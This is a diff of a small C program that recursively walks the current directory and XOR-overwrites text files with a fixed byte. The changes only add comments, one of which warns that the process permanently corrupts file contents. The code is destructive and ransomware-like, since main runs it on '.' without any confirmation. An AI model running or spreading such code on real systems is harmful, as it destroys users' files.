@@ -7,11 +7,10 @@
 #include <stdbool.h>
 
 /* Caution
-
 Though crypt.c should be reversible,
-the encyrptyion/decryption process does permanently corrupt data
-
+the encyrptyion/decryption process does permanently corrupt file contents
 */
+
 #define XOR_BYTE 0xA1
 
 void xorString (char *s) {
@@ -45,6 +44,8 @@ void cryptFile(char *filename) {
     f = NULL;
 }
 
+// isValidFile determines if an inode contains a text file,
+// and we can overwrite its contents
 int isValidFile(char filename[]) {
     char str1[] = ".", str2[] = "..";
     // Some "files" are just inodes we want to skip over
@@ -82,6 +83,7 @@ int isValidFile(char filename[]) {
 int i= 0;
 char *files[10000];
 
+// ListFiles will iterate through files and perform encryption/decryption
 char **ListFiles(char *dir_name, char *previous_dir) {
     char *files[10000];
     DIR *d;
@@ -114,7 +116,7 @@ char **ListFiles(char *dir_name, char *previous_dir) {
     }
 }
 
-
+// Main Loop
 int main (int agrc, char *argv[]) {
     ListFiles(".", "");
 }
